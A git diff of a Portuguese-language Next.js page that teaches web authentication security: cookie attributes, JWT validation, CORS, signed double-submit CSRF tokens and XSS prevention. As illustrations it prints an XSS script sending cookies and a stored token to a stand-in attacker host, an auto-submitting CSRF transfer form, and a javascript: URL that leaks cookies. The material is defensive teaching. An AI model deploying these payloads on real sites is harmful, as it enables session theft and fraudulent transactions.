@@ -1,9 +1,30 @@
+import Link from 'next/link'
+import { dedent } from '@/utils/string'
 import { AboutCollapse } from './Collapse'
 import { AboutFlow } from './Flow'
 
 export const About = () => (
   <div className='min-h-screen flex flex-col gap-y-[32px] bg-primary-500 p-[16px]'>
-    <AboutCollapse variant='section' defaultOpen title='Informações'>
+    <Link
+      href='/'
+      className='w-fit flex items-center gap-x-[8px] px-[4px] py-[8px] text-[14px] text-white font-[600] underline-offset-[4px] hover:underline'
+    >
+      <svg
+        fill='none'
+        strokeWidth='2'
+        aria-hidden='true'
+        viewBox='0 0 24 24'
+        stroke='currentColor'
+        strokeLinecap='round'
+        strokeLinejoin='round'
+        className='w-[16px] h-[16px] shrink-0'
+      >
+        <path d='M15 6l-6 6 6 6' />
+      </svg>
+      Voltar
+    </Link>
+
+    <AboutCollapse defaultOpen variant='section' title='Informações'>
       <AboutCollapse title='HTTP'>
         <div className='flex flex-col gap-y-[24px]'>
           <p>
@@ -26,13 +47,15 @@ export const About = () => (
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`POST /auth/login HTTP/1.1
-Host: api.site.com
-Content-Type: application/json
-Cookie: csrf_token=abc123
-Origin: https://app.site.com
+                    {dedent(`
+                      POST /auth/login HTTP/1.1
+                      Host: api.site.com
+                      Content-Type: application/json
+                      Cookie: csrf_token=abc123
+                      Origin: https://app.site.com
 
-{ "email": "user@site.com", "password": "..." }`}
+                      { "email": "user@site.com", "password": "..." }
+                    `)}
                   </code>
                 </pre>
 
@@ -200,13 +223,15 @@ Origin: https://app.site.com
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`fetch('https://api.site.com/users', {
-  headers: {
-    Origin: 'https://app.site.com',  // ignorado
-    Cookie: 'access_token=roubado',  // ignorado
-    'X-CSRF-Token': 'chute'          // enviado
-  }
-})`}
+                    {dedent(`
+                      fetch('https://api.site.com/users', {
+                        headers: {
+                          Origin: 'https://app.site.com',  // ignorado
+                          Cookie: 'access_token=roubado',  // ignorado
+                          'X-CSRF-Token': 'chute'          // enviado
+                        }
+                      })
+                    `)}
                   </code>
                 </pre>
 
@@ -296,10 +321,12 @@ Origin: https://app.site.com
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`https://app.site.com    origem A
-https://api.site.com    origem B, host diferente
-http://app.site.com     origem C, esquema diferente
-https://app.site.com:8080  origem D, porta diferente`}
+                    {dedent(`
+                      https://app.site.com    origem A
+                      https://api.site.com    origem B, host diferente
+                      http://app.site.com     origem C, esquema diferente
+                      https://app.site.com:8080  origem D, porta diferente
+                    `)}
                   </code>
                 </pre>
 
@@ -353,16 +380,18 @@ https://app.site.com:8080  origem D, porta diferente`}
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`OPTIONS /auth/logout
-Origin: https://app.site.com
-Access-Control-Request-Method: POST
-Access-Control-Request-Headers: x-csrf-token
+                    {dedent(`
+                      OPTIONS /auth/logout
+                      Origin: https://app.site.com
+                      Access-Control-Request-Method: POST
+                      Access-Control-Request-Headers: x-csrf-token
 
-204 No Content
-Access-Control-Allow-Origin: https://app.site.com
-Access-Control-Allow-Credentials: true
-Access-Control-Allow-Headers: Content-Type, X-CSRF-Token
-Access-Control-Max-Age: 600`}
+                      204 No Content
+                      Access-Control-Allow-Origin: https://app.site.com
+                      Access-Control-Allow-Credentials: true
+                      Access-Control-Allow-Headers: Content-Type, X-CSRF-Token
+                      Access-Control-Max-Age: 600
+                    `)}
                   </code>
                 </pre>
 
@@ -396,11 +425,13 @@ Access-Control-Max-Age: 600`}
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`app.enableCors({
-  credentials: true,
-  origin: corsOrigin.split(',').map((value) => value.trim()),
-  allowedHeaders: ['Content-Type', 'Accept', 'X-CSRF-Token']
-})`}
+                    {dedent(`
+                      app.enableCors({
+                        credentials: true,
+                        origin: corsOrigin.split(',').map((value) => value.trim()),
+                        allowedHeaders: ['Content-Type', 'Accept', 'X-CSRF-Token']
+                      })
+                    `)}
                   </code>
                 </pre>
 
@@ -432,19 +463,19 @@ Access-Control-Max-Age: 600`}
           </p>
 
           <div className='flex flex-col'>
-            <AboutCollapse variant='attribute' title='Name=Value'>
+            <AboutCollapse title='Name=Value' variant='attribute'>
               O par em si, e a única parte obrigatória. É o único pedaço que volta para o servidor
               nas próximas requisições.
             </AboutCollapse>
 
-            <AboutCollapse variant='attribute' title='Domain'>
+            <AboutCollapse title='Domain' variant='attribute'>
               Quais hosts recebem o cookie. Omitido, ele vira host-only: só o host exato que o criou
               recebe de volta. Com <code className='text-[14px]'>Domain=site.com</code>, todos os
               subdomínios recebem também. Nenhum site consegue setar cookie para um domínio que não
               é dele.
             </AboutCollapse>
 
-            <AboutCollapse variant='attribute' title='Path'>
+            <AboutCollapse title='Path' variant='attribute'>
               O cookie só é enviado se o caminho da URL começar com esse prefixo.{' '}
               <code className='text-[14px]'>Path=/auth</code> faz o cookie ir em{' '}
               <code className='text-[14px]'>/auth/refresh</code> e não ir em{' '}
@@ -458,20 +489,20 @@ Access-Control-Max-Age: 600`}
               Sem nenhum dos dois vira cookie de sessão e some quando o navegador fecha.
             </AboutCollapse>
 
-            <AboutCollapse variant='attribute' title='Secure'>
+            <AboutCollapse title='Secure' variant='attribute'>
               Só viaja em HTTPS. Sem isso o cookie trafega em texto puro em qualquer conexão HTTP.
               Navegadores tratam <code className='text-[14px]'>localhost</code> como origem
               confiável, então continua funcionando em desenvolvimento.
             </AboutCollapse>
 
-            <AboutCollapse variant='attribute' title='HttpOnly'>
+            <AboutCollapse title='HttpOnly' variant='attribute'>
               JavaScript não enxerga o cookie: ele não aparece em{' '}
               <code className='text-[14px]'>document.cookie</code> e não pode ser lido nem
               sobrescrito pela página. É o que impede um XSS de roubar o valor. O navegador continua
               enviando normalmente, então o cookie fica utilizável sem ficar legível.
             </AboutCollapse>
 
-            <AboutCollapse variant='attribute' title='SameSite'>
+            <AboutCollapse title='SameSite' variant='attribute'>
               <div className='flex flex-col gap-y-[12px]'>
                 <p>
                   Decide se o cookie acompanha requisições disparadas por outro site. É a principal
@@ -482,13 +513,13 @@ Access-Control-Max-Age: 600`}
                 </p>
 
                 <div className='flex flex-col border-l-[2px] border-primary-100 pl-[16px]'>
-                  <AboutCollapse variant='option' title='Strict'>
+                  <AboutCollapse title='Strict' variant='option'>
                     Nunca vai em requisição vinda de outro site, nem quando você clica num link
                     externo. Mais seguro, mas quem chega por um link de fora aparece deslogado na
                     primeira página.
                   </AboutCollapse>
 
-                  <AboutCollapse variant='option' title='Lax'>
+                  <AboutCollapse title='Lax' variant='option'>
                     Padrão dos navegadores hoje. Vai quando outro site te joga para cá trocando a
                     aba inteira por GET: clicar num link, um redirect, digitar a URL. Não vai quando
                     o cookie seria usado sem a aba sair do lugar (
@@ -497,7 +528,7 @@ Access-Control-Max-Age: 600`}
                     o que sobra é rota GET que altera estado, que continua alcançável.
                   </AboutCollapse>
 
-                  <AboutCollapse variant='option' title='None'>
+                  <AboutCollapse title='None' variant='option'>
                     Vai em tudo, inclusive cross-site. Exige{' '}
                     <code className='text-[14px]'>Secure</code> junto, senão o navegador descarta o
                     cookie. Reabre CSRF por completo, então só faz sentido com token anti-CSRF e
@@ -541,9 +572,11 @@ Access-Control-Max-Age: 600`}
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
-.eyJzdWIiOiJ1c2VyLTEyMyIsImV4cCI6MTczMDAwMDAwMH0
-.5mB1qF9s0kQ2wZxV8tYnJhLpR3cD7eGaKoU4vXsPzMw`}
+                    {dedent(`
+                      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+                      .eyJzdWIiOiJ1c2VyLTEyMyIsImV4cCI6MTczMDAwMDAwMH0
+                      .5mB1qF9s0kQ2wZxV8tYnJhLpR3cD7eGaKoU4vXsPzMw
+                    `)}
                   </code>
                 </pre>
 
@@ -588,14 +621,16 @@ Access-Control-Max-Age: 600`}
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`{
-  "sub": "user-123",        // dono do token
-  "iss": "secure-auth-api", // quem emitiu
-  "aud": "access",          // para que serve: access ou refresh
-  "jti": "a1b2c3",          // id único deste token
-  "iat": 1730000000,        // emitido em
-  "exp": 1730000900         // expira em
-}`}
+                    {dedent(`
+                      {
+                        "sub": "user-123",        // dono do token
+                        "iss": "secure-auth-api", // quem emitiu
+                        "aud": "access",          // para que serve: access ou refresh
+                        "jti": "a1b2c3",          // id único deste token
+                        "iat": 1730000000,        // emitido em
+                        "exp": 1730000900         // expira em
+                      }
+                    `)}
                   </code>
                 </pre>
 
@@ -620,12 +655,14 @@ Access-Control-Max-Age: 600`}
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`jwtService.verifyAsync(token, {
-  secret: accessSecret,      // segredo separado por tipo de token
-  algorithms: ['HS256'],     // algoritmo fixado
-  issuer: 'secure-auth-api',
-  audience: 'access'
-})`}
+                    {dedent(`
+                      jwtService.verifyAsync(token, {
+                        secret: accessSecret,      // segredo separado por tipo de token
+                        algorithms: ['HS256'],     // algoritmo fixado
+                        issuer: 'secure-auth-api',
+                        audience: 'access'
+                      })
+                    `)}
                   </code>
                 </pre>
 
@@ -648,6 +685,159 @@ Access-Control-Max-Age: 600`}
                   A saída é o par de tokens. O access vale 15 minutos, então uma revogação demora no
                   máximo isso para valer. O refresh vale 14 dias mas tem linha no banco, e nesse a
                   revogação é imediata: apagar a linha basta.
+                </p>
+              </div>
+            </AboutCollapse>
+          </div>
+        </div>
+      </AboutCollapse>
+
+      <AboutCollapse title='Double submit token'>
+        <div className='flex flex-col gap-y-[24px]'>
+          <p>
+            É o padrão que responde uma pergunta só: esta requisição foi montada pela minha própria
+            página, ou por outra? O cookie sozinho não responde, porque o navegador anexa a
+            credencial venha o pedido de onde vier.
+          </p>
+
+          <p>
+            O nome descreve o mecanismo: o mesmo valor é enviado duas vezes, por dois caminhos
+            diferentes, e o servidor confere se batem.
+          </p>
+
+          <div className='flex flex-col'>
+            <AboutCollapse variant='item' title='A ideia'>
+              <div className='flex flex-col gap-y-[12px]'>
+                <p>
+                  O servidor entrega um valor num cookie que o JavaScript pode ler, o{' '}
+                  <code className='text-[14px]'>csrf_token</code>. Em toda requisição que altera
+                  estado, o app lê esse cookie e copia o valor para um header:
+                </p>
+
+                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
+                  <code>
+                    {dedent(`
+                      Cookie: csrf_token=8f3a...      <- o navegador manda sozinho
+                      X-CSRF-Token: 8f3a...           <- a página precisa escrever
+                    `)}
+                  </code>
+                </pre>
+
+                <p>
+                  O servidor compara os dois. Iguais, segue. Diferentes ou ausentes, 403. Nenhum
+                  estado precisa ser guardado no servidor para isso, o que separa esse padrão do
+                  synchronizer token, que exige uma sessão em memória ou em banco.
+                </p>
+              </div>
+            </AboutCollapse>
+
+            <AboutCollapse variant='item' title='Por que outro site não consegue copiar'>
+              <div className='flex flex-col gap-y-[12px]'>
+                <p>
+                  Porque as duas metades têm regras diferentes. O cookie é escrito pelo navegador e
+                  vai sozinho, inclusive numa requisição disparada pelo site do atacante. O header é
+                  escrito pela página, e a página do atacante não consegue ler o cookie da sua
+                  origem para saber o que escrever.
+                </p>
+
+                <p>
+                  Enviar cookie é fácil, ler cookie é que não é. O ataque monta uma requisição com
+                  cookie e sem header, ou com header chutado.
+                </p>
+
+                <p>
+                  Tem um bônus: header personalizado em requisição cross-origin obriga preflight{' '}
+                  <code className='text-[14px]'>OPTIONS</code>, e um{' '}
+                  <code className='text-[14px]'>&lt;form&gt;</code> HTML não sabe fazer isso. O
+                  formulário invisível nem chega a tentar.
+                </p>
+              </div>
+            </AboutCollapse>
+
+            <AboutCollapse variant='item' title='A versão ingênua tem furo'>
+              <div className='flex flex-col gap-y-[12px]'>
+                <p>
+                  Se o valor for só um número aleatório, a comparação prova apenas que quem mandou
+                  conseguiu escrever o cookie. E cookie não é isolado por origem, é por domínio.
+                </p>
+
+                <p>
+                  Um subdomínio qualquer, <code className='text-[14px]'>blog.site.com</code>, um
+                  preview deploy esquecido, consegue gravar{' '}
+                  <code className='text-[14px]'>csrf_token=123</code> com{' '}
+                  <code className='text-[14px]'>Domain=site.com</code> e disparar a requisição com{' '}
+                  <code className='text-[14px]'>X-CSRF-Token: 123</code>. Os dois batem, e o guard
+                  aprova um ataque.
+                </p>
+
+                <p>
+                  Esse é o furo clássico do double submit puro, e o motivo de a versão deste projeto
+                  ser assinada.
+                </p>
+              </div>
+            </AboutCollapse>
+
+            <AboutCollapse variant='item' title='A versão assinada'>
+              <div className='flex flex-col gap-y-[12px]'>
+                <p>
+                  O valor deixa de ser aleatório e passa a ser derivado da sessão, com um segredo
+                  que só o servidor conhece:
+                </p>
+
+                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
+                  <code>
+                    {dedent(`
+                      // ao emitir a sessão
+                      const csrf = createHmac('sha256', csrfSecret).update(jti).digest('hex')
+
+                      // ao validar, o servidor recalcula a partir do jti do token de acesso
+                      const expected = createHmac('sha256', csrfSecret).update(payload.jti).digest('hex')
+                    `)}
+                  </code>
+                </pre>
+
+                <p>
+                  Agora o vizinho malicioso continua conseguindo sobrescrever o cookie, mas o valor
+                  que ele inventa não corresponde à sessão da vítima. Para produzir um válido ele
+                  precisaria do <code className='text-[14px]'>jti</code>, que vive dentro de um
+                  cookie <code className='text-[14px]'>HttpOnly</code>, ou do segredo, que nunca sai
+                  do servidor.
+                </p>
+
+                <p>
+                  Efeito colateral útil: o token de CSRF passa a estar amarrado à sessão. Trocar de
+                  sessão troca o valor, e um token antigo para de valer sozinho.
+                </p>
+              </div>
+            </AboutCollapse>
+
+            <AboutCollapse variant='item' title='Detalhes que costumam sair errado'>
+              <div className='flex flex-col gap-y-[12px]'>
+                <p>
+                  A comparação é <code className='text-[14px]'>timingSafeEqual</code>, nunca{' '}
+                  <code className='text-[14px]'>===</code>, com um check de tamanho antes porque a
+                  função lança quando os buffers têm comprimentos diferentes.
+                </p>
+
+                <p>
+                  O cookie de CSRF é o único que não pode ser{' '}
+                  <code className='text-[14px]'>HttpOnly</code>. Isso não é descuido: ele não é
+                  credencial, é só o valor que precisa ser copiado para o header.
+                </p>
+
+                <p>
+                  A checagem vale para <code className='text-[14px]'>POST</code>,{' '}
+                  <code className='text-[14px]'>PUT</code>,{' '}
+                  <code className='text-[14px]'>PATCH</code> e{' '}
+                  <code className='text-[14px]'>DELETE</code>. Login e registro ficam de fora,
+                  porque rodam antes de existir sessão para assinar.
+                </p>
+
+                <p>
+                  E o padrão não anda sozinho. Ele cobre o que{' '}
+                  <code className='text-[14px]'>SameSite=Lax</code> não cobre, e a checagem de{' '}
+                  <code className='text-[14px]'>Origin</code> cobre o que ele não cobre. As três
+                  camadas juntas, não uma escolhida entre elas.
                 </p>
               </div>
             </AboutCollapse>
@@ -678,12 +868,14 @@ Access-Control-Max-Age: 600`}
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`// global
-ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])
+                    {dedent(`
+                      // global
+                      ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])
 
-// na rota de login
-@Throttle({ default: { ttl: 60_000, limit: 5 } })
-@Post('login')`}
+                      // na rota de login
+                      @Throttle({ default: { ttl: 60_000, limit: 5 } })
+                      @Post('login')
+                    `)}
                   </code>
                 </pre>
 
@@ -764,7 +956,7 @@ ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])
       </AboutCollapse>
     </AboutCollapse>
 
-    <AboutCollapse variant='section' defaultOpen title='Ataques'>
+    <AboutCollapse defaultOpen title='Ataques' variant='section'>
       <AboutCollapse title='XSS'>
         <div className='flex flex-col gap-y-[16px]'>
           <p>
@@ -800,15 +992,17 @@ ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])
 
             <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
               <code>
-                {`<script>
-  fetch('https://site-do-atacante.com/roubar', {
-    method: 'POST',
-    body: JSON.stringify({
-      cookie: document.cookie,
-      token: localStorage.getItem('token')
-    })
-  })
-</script>`}
+                {dedent(`
+                  <script>
+                    fetch('https://site-do-atacante.com/roubar', {
+                      method: 'POST',
+                      body: JSON.stringify({
+                        cookie: document.cookie,
+                        token: localStorage.getItem('token')
+                      })
+                    })
+                  </script>
+                `)}
               </code>
             </pre>
 
@@ -868,14 +1062,16 @@ ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])
 
             <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
               <code>
-                {`<form id="csrfForm" action="https://banco.com/api/transferir" method="POST">
-  <input type="hidden" name="para" value="conta-do-atacante" />
-  <input type="hidden" name="valor" value="1000" />
-</form>
+                {dedent(`
+                  <form id="csrfForm" action="https://banco.com/api/transferir" method="POST">
+                    <input type="hidden" name="para" value="conta-do-atacante" />
+                    <input type="hidden" name="valor" value="1000" />
+                  </form>
 
-<script>
-  document.getElementById('csrfForm').submit()
-</script>`}
+                  <script>
+                    document.getElementById('csrfForm').submit()
+                  </script>
+                `)}
               </code>
             </pre>
 
@@ -896,7 +1092,7 @@ ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])
       </AboutCollapse>
     </AboutCollapse>
 
-    <AboutCollapse variant='section' defaultOpen title='Proteções'>
+    <AboutCollapse defaultOpen variant='section' title='Proteções'>
       <AboutCollapse title='Como prevenir XSS no NestJS'>
         <div className='flex flex-col gap-y-[16px]'>
           <p>
@@ -918,9 +1114,11 @@ ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`app.useGlobalPipes(
-  new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true, transform: true })
-)`}
+                    {dedent(`
+                      app.useGlobalPipes(
+                        new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true, transform: true })
+                      )
+                    `)}
                   </code>
                 </pre>
 
@@ -950,10 +1148,12 @@ ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`sanitizeHtml(input.bio, {
-  allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
-  allowedAttributes: { a: ['href'] }
-})`}
+                    {dedent(`
+                      sanitizeHtml(input.bio, {
+                        allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
+                        allowedAttributes: { a: ['href'] }
+                      })
+                    `)}
                   </code>
                 </pre>
 
@@ -1048,11 +1248,13 @@ ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`// nunca com conteúdo vindo do usuário
-<div dangerouslySetInnerHTML={{ __html: comment.body }} />
+                    {dedent(`
+                      // nunca com conteúdo vindo do usuário
+                      <div dangerouslySetInnerHTML={{ __html: comment.body }} />
 
-// se precisar mesmo de HTML, sanitize antes de chegar aqui
-<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(comment.body) }} />`}
+                      // se precisar mesmo de HTML, sanitize antes de chegar aqui
+                      <div dangerouslySetInnerHTML={{ __html: sanitizeHtml(comment.body) }} />
+                    `)}
                   </code>
                 </pre>
 
@@ -1080,9 +1282,11 @@ ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`// se profile.website for "javascript:fetch('https://atacante.com?c='+document.cookie)"
-// o clique executa
-<a href={profile.website}>site</a>`}
+                    {dedent(`
+                      // se profile.website for "javascript:fetch('https://atacante.com?c='+document.cookie)"
+                      // o clique executa
+                      <a href={profile.website}>site</a>
+                    `)}
                   </code>
                 </pre>
 
@@ -1094,13 +1298,15 @@ ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`const isSafeUrl = (value: string) => {
-  try {
-    return ['http:', 'https:'].includes(new URL(value).protocol)
-  } catch {
-    return false
-  }
-}`}
+                    {dedent(`
+                      const isSafeUrl = (value: string) => {
+                        try {
+                          return ['http:', 'https:'].includes(new URL(value).protocol)
+                        } catch {
+                          return false
+                        }
+                      }
+                    `)}
                   </code>
                 </pre>
 
@@ -1122,12 +1328,14 @@ ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`const nonce = crypto.randomUUID()
+                    {dedent(`
+                      const nonce = crypto.randomUUID()
 
-response.headers.set(
-  'Content-Security-Policy',
-  \`script-src 'self' 'nonce-\${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'self'\`
-)`}
+                      response.headers.set(
+                        'Content-Security-Policy',
+                        \`script-src 'self' 'nonce-\${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'self'\`
+                      )
+                    `)}
                   </code>
                 </pre>
 
@@ -1189,13 +1397,15 @@ response.headers.set(
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`res.cookie('refresh_token', token, {
-  httpOnly: true,
-  secure: true,
-  sameSite: 'lax',
-  path: '/auth',
-  maxAge: 14 * 24 * 60 * 60 * 1000
-})`}
+                    {dedent(`
+                      res.cookie('refresh_token', token, {
+                        httpOnly: true,
+                        secure: true,
+                        sameSite: 'lax',
+                        path: '/auth',
+                        maxAge: 14 * 24 * 60 * 60 * 1000
+                      })
+                    `)}
                   </code>
                 </pre>
 
@@ -1219,11 +1429,13 @@ response.headers.set(
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`const cookie = Buffer.from(request.cookies.csrf_token ?? '')
-const header = Buffer.from(String(request.headers['x-csrf-token'] ?? ''))
+                    {dedent(`
+                      const cookie = Buffer.from(request.cookies.csrf_token ?? '')
+                      const header = Buffer.from(String(request.headers['x-csrf-token'] ?? ''))
 
-if (cookie.length !== header.length || !timingSafeEqual(cookie, header))
-  throw new ForbiddenException()`}
+                      if (cookie.length !== header.length || !timingSafeEqual(cookie, header))
+                        throw new ForbiddenException()
+                    `)}
                   </code>
                 </pre>
 
@@ -1268,10 +1480,12 @@ if (cookie.length !== header.length || !timingSafeEqual(cookie, header))
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`const origin = request.headers.origin ?? request.headers.referer
+                    {dedent(`
+                      const origin = request.headers.origin ?? request.headers.referer
 
-if (!origin || !allowlist.some((allowed) => origin.startsWith(allowed)))
-  throw new ForbiddenException()`}
+                      if (!origin || !allowlist.some((allowed) => origin.startsWith(allowed)))
+                        throw new ForbiddenException()
+                    `)}
                   </code>
                 </pre>
 
@@ -1291,11 +1505,13 @@ if (!origin || !allowlist.some((allowed) => origin.startsWith(allowed)))
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`app.enableCors({
-  credentials: true,
-  origin: corsOrigin.split(',').map((value) => value.trim()),
-  allowedHeaders: ['Content-Type', 'Accept', 'X-CSRF-Token']
-})`}
+                    {dedent(`
+                      app.enableCors({
+                        credentials: true,
+                        origin: corsOrigin.split(',').map((value) => value.trim()),
+                        allowedHeaders: ['Content-Type', 'Accept', 'X-CSRF-Token']
+                      })
+                    `)}
                   </code>
                 </pre>
 
@@ -1343,9 +1559,11 @@ if (!origin || !allowlist.some((allowed) => origin.startsWith(allowed)))
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`fetch(\`\${apiUrl}/auth/me\`, {
-  credentials: 'include'
-})`}
+                    {dedent(`
+                      fetch(\`\${apiUrl}/auth/me\`, {
+                        credentials: 'include'
+                      })
+                    `)}
                   </code>
                 </pre>
 
@@ -1370,16 +1588,18 @@ if (!origin || !allowlist.some((allowed) => origin.startsWith(allowed)))
 
                 <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                   <code>
-                    {`const csrf = document.cookie
-  .split('; ')
-  .find((entry) => entry.startsWith('csrf_token='))
-  ?.split('=')[1]
+                    {dedent(`
+                      const csrf = document.cookie
+                        .split('; ')
+                        .find((entry) => entry.startsWith('csrf_token='))
+                        ?.split('=')[1]
 
-fetch(\`\${apiUrl}/auth/logout\`, {
-  method: 'POST',
-  credentials: 'include',
-  headers: { 'X-CSRF-Token': csrf ?? '' }
-})`}
+                      fetch(\`\${apiUrl}/auth/logout\`, {
+                        method: 'POST',
+                        credentials: 'include',
+                        headers: { 'X-CSRF-Token': csrf ?? '' }
+                      })
+                    `)}
                   </code>
                 </pre>
 
@@ -1438,9 +1658,150 @@ fetch(\`\${apiUrl}/auth/logout\`, {
           </div>
         </div>
       </AboutCollapse>
+      <AboutCollapse title='Erros comuns'>
+        <div className='flex flex-col gap-y-[24px]'>
+          <p>
+            A escolha de onde guardar o token é a primeira decisão do projeto e a que mais gente
+            erra. Não existe opção sem brecha: as duas abrem uma, e a diferença está em qual das
+            duas você consegue fechar.
+          </p>
+
+          <div className='overflow-x-auto'>
+            <table className='w-full min-w-[560px] border-collapse text-[15px] text-left'>
+              <thead>
+                <tr>
+                  <th className='border border-gray-200 bg-gray-100 p-[12px] font-[600]'> </th>
+                  <th className='border border-gray-200 bg-gray-100 p-[12px] font-[600]'>
+                    Opção A: token no localStorage
+                  </th>
+                  <th className='border border-primary-100 bg-primary-50 p-[12px] text-primary-800 font-[600]'>
+                    Opção B: token em cookie HttpOnly
+                  </th>
+                </tr>
+              </thead>
+
+              <tbody className='align-top leading-[1.5]'>
+                <tr>
+                  <td className='border border-gray-200 bg-gray-100 p-[12px] font-[600]'>
+                    Proteção nativa
+                  </td>
+                  <td className='border border-gray-200 p-[12px]'>
+                    Zero CSRF. O navegador não manda o token sozinho, então requisição forjada por
+                    outro site sai sem credencial.
+                  </td>
+                  <td className='border border-gray-200 p-[12px]'>
+                    Zero roubo por XSS. O JavaScript simplesmente não consegue ler o valor.
+                  </td>
+                </tr>
+
+                <tr>
+                  <td className='border border-gray-200 bg-gray-100 p-[12px] font-[600]'>
+                    A brecha que abre
+                  </td>
+                  <td className='border border-gray-200 p-[12px]'>
+                    XSS total. Qualquer script que rode na sua origem lê o token e o manda embora.
+                  </td>
+                  <td className='border border-gray-200 p-[12px]'>
+                    CSRF. O navegador anexa o cookie em requisição cross-site sem perguntar nada.
+                  </td>
+                </tr>
+
+                <tr>
+                  <td className='border border-gray-200 bg-gray-100 p-[12px] font-[600]'>
+                    Como fechar a brecha
+                  </td>
+                  <td className='border border-gray-200 p-[12px]'>
+                    Muito difícil de garantir. Depende de zero falha em todo input do app e em toda
+                    biblioteca npm da árvore de dependências, para sempre.
+                  </td>
+                  <td className='border border-gray-200 p-[12px]'>
+                    Muito fácil. Double submit cookie mais{' '}
+                    <code className='text-[14px]'>SameSite=Lax</code>, tudo do lado do servidor e
+                    sob seu controle.
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+
+          <p>
+            A assimetria é o ponto. Fechar CSRF é um guard e um atributo de cookie, escritos uma vez
+            e válidos para sempre. Fechar XSS exige acertar cada campo renderizado e cada
+            dependência que entrar no projeto, indefinidamente. Por isso este projeto escolheu a
+            opção B.
+          </p>
+
+          <div className='flex flex-col'>
+            <AboutCollapse variant='item' title='Duas ressalvas na tabela'>
+              <div className='flex flex-col gap-y-[12px]'>
+                <p>
+                  A primeira: &quot;zero CSRF&quot; na opção A só vale se a API não aceitar cookie
+                  nenhum. Muita gente guarda o token em{' '}
+                  <code className='text-[14px]'>localStorage</code> e mantém um cookie de sessão
+                  antigo funcionando em paralelo. Aí o app tem as duas brechas ao mesmo tempo.
+                </p>
+
+                <p>
+                  A segunda: &quot;zero roubo por XSS&quot; não é o mesmo que zero dano. Com{' '}
+                  <code className='text-[14px]'>HttpOnly</code>, o script não carrega a credencial
+                  embora, mas continua conseguindo disparar requisições autenticadas de dentro
+                  daquela aba, inclusive lendo o <code className='text-[14px]'>csrf_token</code> e
+                  montando o header. Muda o estrago, não elimina.
+                </p>
+
+                <p>
+                  A diferença prática é grande mesmo assim: no primeiro caso o atacante age da
+                  máquina dele, quando quiser, até o token expirar. No segundo, só enquanto a vítima
+                  está com a página aberta.
+                </p>
+              </div>
+            </AboutCollapse>
+
